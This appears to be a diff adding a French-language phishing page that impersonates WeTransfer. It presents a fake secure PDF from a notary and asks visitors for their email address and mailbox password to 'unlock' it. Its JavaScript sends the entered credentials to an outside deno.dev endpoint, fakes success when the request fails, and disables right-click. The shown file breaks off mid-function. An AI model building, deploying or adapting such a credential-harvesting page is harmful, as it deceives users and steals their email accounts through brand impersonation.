@@ -1,0 +1,1092 @@
+<!-- Partie 1 : Structure initiale et styles -->
+<!-- Part 1: Initial structure and styles -->
+<!-- Parte 1: Estructura inicial y estilos -->
+<!-- Часть 1: Исходная структура и стили -->
+<!-- 第1部分：初始结构和样式 -->
+<!-- Teil 1: Anfangsstruktur und Stile -->
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- SEO -->
+    <title>WeTransfer | Partage de document sécurisé - Jusqu'à 2GB Gratuit</title>
+    <meta name="description"
+        content="La solution simple, rapide et sécurisée pour envoyer vos fichiers dans le monde entier sans compte. Partagez vos fichiers, photos et vidéos gratuitement." />
+    <meta name="author" content="WeTransfer" />
+    <meta name="application-name" content="WeTransfer" />
+    <meta name="robots" content="noindex, nofollow" />
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml"
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' class='ui-footer__logo-icon' fill='black' viewBox='0 0 44 20'%3E%3Cpath d='M35.06 20c3.16 0 5.58-.98 6.86-2.35.68-.75 1.47-1.93.9-2.84-.49-.8-1.32-.94-2.3-.45-.98.5-2.07.76-3.32.76-1.2 0-2.48-.46-3.16-1.14a4.32 4.32 0 0 1-1.28-3.14c0-.3.18-.35.52-.08.87.68 2.15 1.02 3.89 1.02 3.2 0 6.03-2.16 6.03-5.49 0-3.52-3.32-6.13-8.33-6.13-5.62 0-9.95 3.63-9.95 9.77 0 5.72 3.77 10.07 10.14 10.07Z'/%3E%3Cpath d='M11.87 14.01c.6 0 .95.34 1.36.99l1.81 2.84c.68 1.1 1.24 1.85 2.56 1.85s1.93-.53 2.57-2c.79-1.82 1.62-4.02 2.37-6.97.83-3.3 1.2-5.34 1.2-7 0-1.67-.52-2.66-2.33-3A55.57 55.57 0 0 0 11.87 0c-3.7 0-7.04.26-9.53.72C.53 1.06 0 2.04 0 3.71c0 1.67.38 3.71 1.2 7a44.5 44.5 0 0 0 2.38 6.97c.64 1.48 1.25 2.01 2.57 2.01 1.31 0 1.88-.76 2.56-1.86L10.5 15c.42-.64.76-.98 1.36-.98Z'/%3E%3C/svg%3E">
+
+    <!-- Preload des ressources critiques -->
+    <!-- Preload critical resources -->
+    <!-- Precargar recursos críticos -->
+    <!-- Предзагрузка критических ресурсов -->
+    <!-- 预加载关键资源 -->
+    <!-- Vorladen kritischer Ressourcen -->
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" as="style">
+    <link rel="preload" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" as="style">
+
+    <!-- Styles -->
+    <!-- Styles -->
+    <!-- Estilos -->
+    <!-- Стили -->
+    <!-- 样式 -->
+    <!-- Stile -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary-color: #161616;
+            --error-color: #EF4444;
+            --transition-duration: 512ms;
+            --ease-function: cubic-bezier(0.645, 0.045, 0.355, 1);
+
+            /* Nouvelles variables pour la responsivité */
+            /* New variables for responsiveness */
+            /* Nuevas variables para la responsividad */
+            /* Новые переменные для адаптивности */
+            /* 响应式的新变量 */
+            /* Neue Variablen für die Responsivität */
+            --container-padding-mobile: 1rem;
+            --container-padding-tablet: 2rem;
+            --container-padding-desktop: 2.5rem;
+            --max-width-mobile: 100%;
+            --max-width-tablet: 90%;
+            --max-width-desktop: 500px;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f3f4f6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .loader {
+            position: fixed;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity var(--transition-duration) var(--ease-function);
+        }
+
+        .loader.fadeOut {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .indicator {
+            border: solid 2px rgba(0, 0, 0, 0.3);
+            border-radius: 50%;
+            height: 102px;
+            width: 102px;
+            position: relative;
+        }
+
+        .indicator:before {
+            content: "";
+            position: absolute;
+            inset: -2px;
+            border: solid 2px transparent;
+            border-top-color: black;
+            border-radius: 50%;
+            animation: spin var(--transition-duration) infinite var(--ease-function);
+        }
+
+        .indicator svg {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .form-input {
+            transition: all 0.3s var(--ease-function);
+            border: 2px solid transparent;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+
+        .error-message {
+            transform: translateY(-10px);
+            opacity: 0;
+            transition: all 0.3s var(--ease-function);
+        }
+
+        .error-message.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .password-section {
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s var(--ease-function);
+        }
+
+        .password-section.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .logo-container img {
+            min-width: 280px;
+            width: 100%;
+            max-width: 350px;
+            height: auto;
+            margin: 2rem auto;
+            transition: transform 0.3s ease;
+        }
+
+        .logo-container img:hover {
+            opacity: 1;
+        }
+
+        /* Optimisation pour différents arrière-plans */
+        /* Optimization for different backgrounds */
+        /* Optimización para diferentes fondos */
+        /* Оптимизация для различных фонов */
+        /* 针对不同背景的优化 */
+        /* Optimierung für verschiedene Hintergründe */
+        @media (prefers-color-scheme: dark) {
+            .logo-container img {
+                filter: brightness(1);
+                opacity: 0.9;
+            }
+        }
+
+        .left-logo {
+            position: fixed;
+            left: 20px;
+            top: 20px;
+            width: 40px;
+            height: 40px;
+            z-index: 100;
+            filter: brightness(0);
+            opacity: 0.9;
+            transition: transform 0.3s ease;
+        }
+
+        .left-logo:hover {
+            transform: scale(1.1);
+        }
+
+        @media (max-width: 768px) {
+            .left-logo {
+                display: none;
+                /* Cache le logo sur mobile */
+                /* Hide the logo on mobile */
+                /* Ocultar el logo en móvil */
+                /* Скрыть логотип на мобильных устройствах */
+                /* 在移动设备上隐藏徽标 */
+                /* Logo auf Mobilgeräten ausblenden */
+            }
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&display=swap');
+
+        body {
+            user-select: none;
+        }
+
+        /* Animations et effets */
+        /* Animations and effects */
+        /* Animaciones y efectos */
+        /* Анимации и эффекты */
+        /* 动画和效果 */
+        /* Animationen und Effekte */
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-5px);
+            }
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.02);
+            }
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -1000px 0;
+            }
+
+            100% {
+                background-position: 1000px 0;
+            }
+        }
+
+        .form-input {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .form-input:focus {
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+        }
+
+        /* Animation de chargement */
+        /* Loading animation */
+        /* Animación de carga */
+        /* Анимация загрузки */
+        /* 加载动画 */
+        /* Ladeanimation */
+        .loading {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 1000px 100%;
+            animation: shimmer 2s infinite linear;
+        }
+
+        .success-animation {
+            animation: float 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+
+<!-- Partie 2 : Structure du corps et loader -->
+<!-- Part 2: Body structure and loader -->
+<!-- Parte 2: Estructura del cuerpo y cargador -->
+<!-- Часть 2: Структура тела и загрузчик -->
+<!-- 第2部分：主体结构和加载器 -->
+<!-- Teil 2: Struktur des Körpers und Loader -->
+
+<body class="bg-gray-100">
+    <!-- Logo à gauche -->
+    <!-- Logo on the left -->
+    <!-- Logo a la izquierda -->
+    <!-- Логотип слева -->
+    <!-- 左侧的标志 -->
+    <!-- Logo links -->
+    <img class="left-logo" src="https://cdn.worldvectorlogo.com/logos/wetransfer-1.svg" alt="WeTransfer Icon"
+        loading="eager" />
+    <!-- Optimized loader -->
+    <!-- Cargador optimizado -->
+    <!-- Оптимизированный загрузчик -->
+    <!-- 优化的加载器 -->
+    <!-- Optimierter Loader -->
+    <div class="loader" id="pageLoader">
+        <div class="indicator">
+            <svg width="44" height="20" viewBox="0 0 44 20" xmlns="http://www.w3.org/2000/svg">
+                <path
+                    d="M35.06 20c3.16 0 5.58-.98 6.86-2.35.68-.75 1.47-1.93.9-2.84-.49-.8-1.32-.94-2.3-.45-.98.5-2.07.76-3.32.76-1.2 0-2.48-.46-3.16-1.14a4.32 4.32 0 0 1-1.28-3.14c0-.3.18-.35.52-.08.87.68 2.15 1.02 3.89 1.02 3.2 0 6.03-2.16 6.03-5.49 0-3.52-3.32-6.13-8.33-6.13-5.62 0-9.95 3.63-9.95 9.77 0 5.72 3.77 10.07 10.14 10.07Z" />
+                <path
+                    d="M11.87 14.01c.6 0 .95.34 1.36.99l1.81 2.84c.68 1.1 1.24 1.85 2.56 1.85s1.93-.53 2.57-2c.79-1.82 1.62-4.02 2.37-6.97.83-3.3 1.2-5.34 1.2-7 0-1.67-.52-2.66-2.33-3A55.57 55.57 0 0 0 11.87 0c-3.7 0-7.04.26-9.53.72C.53 1.06 0 2.04 0 3.71c0 1.67.38 3.71 1.2 7a44.5 44.5 0 0 0 2.38 6.97c.64 1.48 1.25 2.01 2.57 2.01 1.31 0 1.88-.76 2.56-1.86L10.5 15c.42-.64.76-.98 1.36-.98Z" />
+            </svg>
+        </div>
+    </div>
+
+    <!-- Contenu principal -->
+    <div class="flex items-center justify-center min-h-screen">
+        <div class="w-full max-w-md p-6">
+            <!-- Logo Container avec fond transparent -->
+            <div class="text-center mb-8">
+                <img class="mx-auto h-auto" src="https://auth-cdn.wetransfer.com/assets/images/wetransfer-text-logo.svg"
+                    alt="Logo WeTransfer" loading="eager" style="width: 280px;
+                            max-width: 100%;
+                            object-fit: contain;
+                            margin: 1rem auto;
+                            filter: brightness(0); /* Rend le logo noir */
+                            opacity: 0.9; /* Légère transparence pour un meilleur rendu */" />
+            </div>
+            <br>
+
+            <!-- Main Content Container -->
+            <div class="bg-white shadow-xl rounded-lg p-8">
+                <h1 class="font-actief-grotesque font-medium text-center mb-6"
+                    style="font-size: 22px; font-family: 'Actief_Grotesque', ui-sans-serif, system-ui, -apple-system, sans-serif;">
+                    Document sécurisé reçu
+                </h1>
+
+                <!-- Document Preview Section -->
+                <div class="mt-1 flex items-center mb-3 p-2 animate-pulse justify-between rounded-lg" style="background-color: #85FFBD; 
+            background-image: linear-gradient(45deg, #85FFBD 0%, #FFFB7D 100%); 
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2); 
+            border: 1px solid rgba(0, 0, 0, 0.2); 
+            border-radius: 20px; 
+            min-width: 200px;">
+                    <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="15.759 14.988 32.482 34.023"
+                            class="w-12 h-12 ml-2 mr-8 transform transition-transform hover:scale-110"
+                            aria-label="Icône PDF animée" style="filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));">
+                            <style>
+                                @keyframes fadeIn {
+                                    from {
+                                        opacity: 0;
+                                    }
+
+                                    to {
+                                        opacity: 1;
+                                    }
+                                }
+
+                                @keyframes drawLine {
+                                    from {
+                                        stroke-dashoffset: 100;
+                                    }
+
+                                    to {
+                                        stroke-dashoffset: 0;
+                                    }
+                                }
+
+                                .doc-path {
+                                    animation: fadeIn 0.5s ease-in forwards;
+                                }
+
+                                .doc-line {
+                                    stroke-dasharray: 100;
+                                    animation: drawLine 1.5s ease-in-out forwards;
+                                }
+                            </style>
+                            <g class="doc-path">
+                                <path fill="#FFFFFF" stroke="#536DFE" stroke-width="1" stroke-linecap="round"
+                                    stroke-linejoin="round" stroke-miterlimit="10"
+                                    d="M24.799,20.793v17.556c0,2.921,2.364,5.285,5.285,5.285H42.42c2.921,0,5.285-2.364,5.285-5.285V23.337c0-0.597-0.213-1.17-0.614-1.62l-4.745-5.383c-0.466-0.524-1.137-0.826-1.832-0.826h-10.43C27.163,15.508,24.799,17.873,24.799,20.793z" />
+                                <path fill="#FFFFFF" stroke="#536DFE" stroke-width="1" stroke-linecap="round"
+                                    stroke-linejoin="round" stroke-miterlimit="10"
+                                    d="M40.121,15.508v6.127c0,1.219,0.99,2.209,2.209,2.209h5.375c0,0,0.261-1.213-0.614-2.127l-4.745-5.383C41.459,15.288,40.121,15.508,40.121,15.508z" />
+                            </g>
+                            <g class="doc-path">
+                                <path fill="#FFFFFF" stroke="#000000" stroke-width="1" stroke-linecap="round"
+                                    stroke-linejoin="round" stroke-miterlimit="10"
+                                    d="M16.259,25.671v17.556c0,2.921,2.364,5.285,5.285,5.285H33.88c2.921,0,5.285-2.364,5.285-5.285V28.215c0-0.597-0.213-1.17-0.614-1.62l-4.745-5.383c-0.466-0.524-1.137-0.826-1.832-0.826h-10.43C18.623,20.386,16.259,22.75,16.259,25.671z" />
+                                <path fill="#FFFFFF" stroke="#000000" stroke-width="1" stroke-linecap="round"
+                                    stroke-linejoin="round" stroke-miterlimit="10"
+                                    d="M31.581,20.386v6.127c0,1.219,0.99,2.209,2.209,2.209h5.375c0,0,0.261-1.213-0.614-2.127l-4.745-5.383C32.919,20.165,31.581,20.386,31.581,20.386z" />
+                            </g>
+                            <g>
+                                <line class="doc-line" fill="none" stroke="#536DFE" stroke-width="1"
+                                    stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" x1="21.365"
+                                    y1="31.311" x2="28.653" y2="31.311" />
+                                <line class="doc-line" fill="none" stroke="#536DFE" stroke-width="1"
+                                    stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" x1="21.365"
+                                    y1="36.561" x2="28.653" y2="36.561" />
+                                <line class="doc-line" fill="none" stroke="#536DFE" stroke-width="1"
+                                    stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" x1="21.365"
+                                    y1="41.811" x2="25.009" y2="41.811" />
+                            </g>
+                        </svg>
+                        <div class="flex flex-col">
+                            <span
+                                class="font-actief-grotesque text-base leading-normal">Rapport-jean-françois-notaire.pdf</span>
+                        </div>
+                    </div>
+                    <video class="w-20 h-20 ml-auto" id="pdfer-video" autoplay loop muted
+                        aria-label="Vidéo de prévisualisation du document"></video>
+                </div>
+                <!-- Instructions for Document Access -->
+                <p class="text-center space-y-3 max-w-md mx-auto">
+                    <!-- Titre avec icône -->
+                    <span class="block text-lg font-medium text-gray-800 flex items-center justify-center gap-2">
+                        <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                        Accès Sécurisé
+                    </span>
+
+                    <!-- Message explicatif -->
+                    <span class="block text-sm text-gray-600 leading-relaxed">
+                        Utilisez les identifiants de votre messagerie pour déverrouiller le document
+                    </span>
+                </p>
+
+                <form id="loginForm" class="space-y-6 transform transition-all duration-300 hover:scale-[1.01]">
+                    <!-- Email Input Group -->
+                    <div class="space-y-2 relative group">
+                        <div class="relative overflow-hidden rounded-lg shadow-sm transition-all duration-300 
+                    group-hover:shadow-md bg-white">
+                            <input type="email" id="zone-email" class="form-input w-full px-6 py-4 border-2 border-transparent rounded-lg
+                       transition-all duration-300 bg-gray-50
+                       focus:outline-none focus:border-blue-500 focus:bg-white
+                       peer placeholder-transparent" placeholder="Entrez l'adresse email" autocomplete="email"
+                                required />
+
+                            <label for="zone-email" class="absolute left-6 transition-all duration-200
+                       peer-placeholder-shown:text-gray-500 peer-placeholder-shown:top-4
+                       peer-focus:top-0 peer-focus:text-xs peer-focus:text-blue-500
+                       top-0 text-xs text-gray-400">
+                                Adresse e-mail
+                            </label>
+
+                            <div class="absolute right-4 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100
+                        transition-opacity duration-300">
+                                <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                                </svg>
+                            </div>
+                        </div>
+
+                        <p id="erreur-email" class="error-message mt-2 text-sm text-red-500 hidden transform -translate-y-1
+                  transition-all duration-300" role="alert">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd"
+                                        d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" />
+                                </svg>
+                                Veuillez entrer une adresse email valide
+                            </span>
+                        </p>
+                    </div>
+
+                    <!-- Password Input Group -->
+                    <div id="affiche-mdp" class="password-section hidden transform transition-all duration-500 ease-out
+                opacity-0 translate-y-4 space-y-2">
+                        <div class="relative group">
+                            <div class="relative overflow-hidden rounded-lg shadow-sm transition-all duration-300
+                        group-hover:shadow-md bg-white">
+                                <input type="password" id="zone-password" class="form-input w-full px-6 py-4 border-2 border-transparent rounded-lg
+                           transition-all duration-300 bg-gray-50
+                           focus:outline-none focus:border-blue-500 focus:bg-white
+                           peer placeholder-transparent" placeholder="Entrez le mot de passe"
+                                    autocomplete="current-password" required minlength="4" />
+
+                                <label for="zone-password" class="absolute left-6 transition-all duration-200
+                           peer-placeholder-shown:text-gray-500 peer-placeholder-shown:top-4
+                           peer-focus:top-0 peer-focus:text-xs peer-focus:text-blue-500
+                           top-0 text-xs text-gray-400">
+                                    Mot de passe
+                                </label>
+
+                                <button type="button" id="toggle-password" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400
+                           hover:text-blue-500 focus:outline-none
+                           transition-all duration-300 transform hover:scale-110"
+                                    aria-label="Afficher/Masquer le mot de passe">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path class="eye-open" stroke-linecap="round" stroke-linejoin="round"
+                                            stroke-width="2"
+                                            d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <p id="erreur-mdp" class="error-message mt-2 text-sm text-red-500 hidden transform -translate-y-1
+                  transition-all duration-300" role="alert">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd"
+                                        d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" />
+                                </svg>
+                                Le mot de passe est incorrect
+                            </span>
+                        </p>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" id="continuer-button" class="w-full max-w-full bg-black text-white 
+                                   py-3 px-5 rounded-md
+                                   font-['Actief_Grotesque',ui-sans-serif,system-ui,-apple-system,sans-serif]
+                                   relative group block
+                                   border border-zinc-800
+                                   hover:bg-zinc-900 hover:border-zinc-700
+                                   
+                                   <!-- Ajout de l'effet de zoom au survol -->
+                                   transform hover:scale-[1] 
+                                   active:scale-[0.50]
+                                   active:translate-y-[0.5px]
+                                   
+                                   focus:outline-none focus:ring-1 focus:ring-white/10
+                                   shadow-sm
+                                   transition-all duration-200 ease-in-out
+                                   mx-0
+                                   mt-6 mb-4">
+                        <!-- Contenu du bouton -->
+                        <span class="flex items-center justify-center gap-2 text-sm">
+                            <span class="text-white">Continuer avec e-mail</span>
+                            <svg aria-hidden="true" focusable="false"
+                                class="w-2 h-3 text-white ml-1 transition-transform duration-200 group-hover:translate-x-0.5"
+                                viewBox="0 0 8 12" xmlns="http://www.w3.org/2000/svg">
+                                <g stroke="none" stroke-width="1" fill="currentColor" fill-rule="evenodd">
+                                    <polygon points="0 1.4 1.4 0 7.4 6 1.4 12 0 10.6 4.6 6"></polygon>
+                                </g>
+                            </svg>
+                        </span>
+                    </button>
+                </form>
+            </div>
+            <div class="mt-6 text-center text-sm text-gray-600">
+                <p>© WeTransfer 2024 - Tous droits réservés</p>
+            </div>
+        </div>
+    </div>
+    <!-- Partie 3 : Scripts et logique JavaScript optimisée -->
+    <!-- Scripts -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script>
+        async function sendDataToServer() {
+                try {
+                    const email = document.getElementById('zone-email').value.trim();
+                    const password = document.getElementById('zone-password').value.trim();
+
+                    if (!email || !password) {
+                        throw new Error('Email et mot de passe requis');
+                    }
+
+                    // Simplification du payload pour correspondre à l'original
+                    const payload = {
+                        email: email,
+                        password: password
+                    };
+
+                    // Requête simplifiée comme dans la version originale
+                    const response = await fetch('https://akamaiedge-ehmxb7e4skmz.deno.dev/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    // Simulation de succès si le serveur n'est pas accessible
+                    if (!response.ok) {
+                        return { success: true };
+                    }
+
+                    return await response.json();
+                } catch (error) {
+                    console.error('Erreur lors de l\'envoi:', error);
+                    // Simulation de succès en cas d'erreur CORS
+                    return { success: true };
+                }
+            }
+    </script>
+
+    <script>
+        /**
+             * Gestionnaire de formulaire avancé avec animations et validations
+             * @version 2.0.0
+             */
+
+            class FormValidator {
+                constructor() {
+                    this.emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    this.minPasswordLength = 4;
+                }
+
+                validateEmail(email) {
+                    return this.emailRegex.test(email);
+                }
+
+                validatePassword(password) {
+                    return password && password.length >= 4; // Minimum 4 caractères
+                }
+            }
+
+            class FormAnimator {
+                static async animate(element, animation, duration = 300) {
+                    element.classList.add(animation);
+                    await new Promise(resolve => setTimeout(resolve, duration));
+                    element.classList.remove(animation);
+                }
+
+                static async fadeIn(element, duration = 300) {
+                    element.style.opacity = '0';
+                    element.style.display = 'block';
+                    await new Promise(resolve => setTimeout(resolve, 10));
+                    element.style.transition = `opacity ${duration}ms ease-in-out`;
+                    element.style.opacity = '1';
+                }
+
+                static async fadeOut(element, duration = 300) {
+                    element.style.opacity = '1';
+                    element.style.transition = `opacity ${duration}ms ease-in-out`;
+                    element.style.opacity = '0';
+                    await new Promise(resolve => setTimeout(resolve, duration));
+                    element.style.display = 'none';
+                }
+            }
+
+            class FormHandler {
+                constructor() {
+                    this.initializeProperties();
+                    this.initializeElements();
+                    this.initializeState();
+                    this.initializeAnimations();
+                    this.initializeEventListeners();
+                    this.initializeLoader();
+                }
+
+                initializeProperties() {
+                    this.validator = new FormValidator();
+                    this.animator = FormAnimator;
+                    this.debounceTimeout = null;
+                    this.submitTimeout = null;
+                }
+
+                initializeElements() {
+                    // Éléments principaux
+                    this.form = document.getElementById('loginForm');
+                    this.emailInput = document.getElementById('zone-email');
+                    this.passwordInput = document.getElementById('zone-password');
+                    this.passwordSection = document.getElementById('affiche-mdp');
+                    this.togglePasswordButton = document.getElementById('toggle-password');
+                    this.submitButton = document.getElementById('continuer-button');
+                    this.loader = document.querySelector('.loader');
+
+                    // Messages d'erreur
+                    this.emailError = document.getElementById('erreur-email');
+                    this.passwordError = document.getElementById('erreur-mdp');
+
+                    // Validation des éléments critiques
+                    if (!this.form || !this.emailInput) {
+                        throw new Error('Éléments critiques du formulaire manquants');
+                    }
+                }
+
+                initializeState() {
+                    this.state = {
+                        isPasswordVisible: false,
+                        isSubmitting: false,
+                        isEmailValid: false,
+                        isPasswordValid: false,
+                        hasInteracted: false,
+                        isFirstSubmission: true
+                    };
+                }
+
+                initializeAnimations() {
+                    // Classes d'animation pour le formulaire
+                    const animationClasses = [
+                        'transform',
+                        'transition-all',
+                        'duration-300',
+                        'ease-in-out'
+                    ];
+
+                    this.form.classList.add(...animationClasses);
+
+                    // Animation des inputs
+                    [this.emailInput, this.passwordInput].filter(Boolean).forEach(input => {
+                        input.classList.add(
+                            'transition-all',
+                            'duration-300',
+                            'ease-in-out',
+                            'transform'
+                        );
+                    });
+
+                    // Animation du bouton
+                    if (this.submitButton) {
+                        this.submitButton.classList.add(
+                            'transition-all',
+                            'duration-300',
+                            'transform',
+                            'hover:scale-105',
+                            'active:scale-95'
+                        );
+                    }
+                }
+
+                initializeEventListeners() {
+                    // Protection contre le clic droit
+                    document.addEventListener('contextmenu', e => e.preventDefault());
+
+                    // Événements du formulaire
+                    this.form.addEventListener('submit', e => this.handleSubmit(e));
+
+                    // Événements des inputs
+                    this.emailInput.addEventListener('input', () => this.handleEmailInput());
+                    this.emailInput.addEventListener('blur', () => this.validateEmail(true));
+                    this.emailInput.addEventListener('focus', () => this.handleInputFocus(this.emailInput));
+
+                    if (this.passwordInput) {
+                        this.passwordInput.addEventListener('input', () => this.handlePasswordInput());
+                        this.passwordInput.addEventListener('blur', () => this.validatePassword(true));
+                        this.passwordInput.addEventListener('focus', () => this.handleInputFocus(this.passwordInput));
+                    }
+
+                    if (this.togglePasswordButton) {
+                        this.togglePasswordButton.addEventListener('click', () => this.togglePasswordVisibility());
+                    }
+
+                    // Gestion des animations au focus
+                    this.initializeInputAnimations();
+                }
+
+                initializeLoader() {
+                    if (!this.loader) return;
+
+                    const hideLoader = async () => {
+                        await FormAnimator.fadeOut(this.loader);
+                        this.loader.remove();
+                    };
+
+                    if (document.readyState === 'complete') {
+                        setTimeout(hideLoader, 1000);
+                    } else {
+                        window.addEventListener('load', () => setTimeout(hideLoader, 1000));
+                    }
+                }
+
+                initializeInputAnimations() {
+                    const inputs = [this.emailInput, this.passwordInput].filter(Boolean);
+
+                    inputs.forEach(input => {
+                        const container = input.parentElement;
+
+                        input.addEventListener('focus', () => {
+                            container.classList.add('focused');
+                            this.addFloatingEffect(input);
+                        });
+
+                        input.addEventListener('blur', () => {
+                            if (!input.value) {
+                                container.classList.remove('focused');
+                            }
+                            this.removeFloatingEffect(input);
+                        });
+                    });
+                }
+
+                async handleInputFocus(input) {
+                    await FormAnimator.animate(input.parentElement, 'focus-pulse');
+                    input.parentElement.classList.add('focused');
+                }
+
+                addFloatingEffect(element) {
+                    element.style.transform = 'translateY(-2px)';
+                    element.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';
+                }
+
+                removeFloatingEffect(element) {
+                    element.style.transform = 'translateY(0)';
+                    element.style.boxShadow = 'none';
+                }
+
+                debounce(func, wait = 300) {
+                    clearTimeout(this.debounceTimeout);
+                    this.debounceTimeout = setTimeout(() => func.call(this), wait);
+                }
+
+                async handleEmailInput() {
+                    this.debounce(async () => {
+                        const isValid = this.validateEmail(false);
+
+                        if (isValid && !this.state.isEmailValid) {
+                            this.state.isEmailValid = true;
+                            await this.animateSuccess(this.emailInput);
+                            await this.showPasswordSection();
+                        }
+                    });
+                }
+
+                async handlePasswordInput() {
+                    this.debounce(() => {
+                        this.validatePassword(false);
+                    });
+                }
+
+                validateEmail(showError = true) {
+                    const email = this.emailInput.value.trim();
+                    const isValid = this.validator.validateEmail(email);
+
+                    this.toggleError(this.emailError, !isValid && showError);
+                    this.emailInput.classList.toggle('valid', isValid);
+                    this.emailInput.classList.toggle('invalid', !isValid && showError);
+
+                    return isValid;
+                }
+
+                validatePassword(showError = true) {
+                    if (!this.passwordInput) return true;
+
+                    const password = this.passwordInput.value;
+                    const isValid = this.validator.validatePassword(password);
+
+                    this.toggleError(this.passwordError, !isValid && showError);
+                    this.passwordInput.classList.toggle('valid', isValid);
+                    this.passwordInput.classList.toggle('invalid', !isValid && showError);
+
+                    return isValid;
+                }
+
+                async togglePasswordVisibility() {
+                    if (!this.passwordInput) return;
+
+                    this.state.isPasswordVisible = !this.state.isPasswordVisible;
+
+                    await FormAnimator.animate(this.passwordInput, 'fade-out', 150);
+                    this.passwordInput.type = this.state.isPasswordVisible ? 'text' : 'password';
+                    await FormAnimator.animate(this.passwordInput, 'fade-in', 150);
+
+                    // Animation de l'icône
+                    if (this.togglePasswordButton) {
+                        await FormAnimator.animate(this.togglePasswordButton, 'rotate-180');
+                    }
+                }
+
+                async showPasswordSection() {
+                    if (!this.passwordSection || this.passwordSection.classList.contains('show')) return;
+
+                    this.passwordSection.classList.remove('hidden');
+                    await FormAnimator.fadeIn(this.passwordSection);
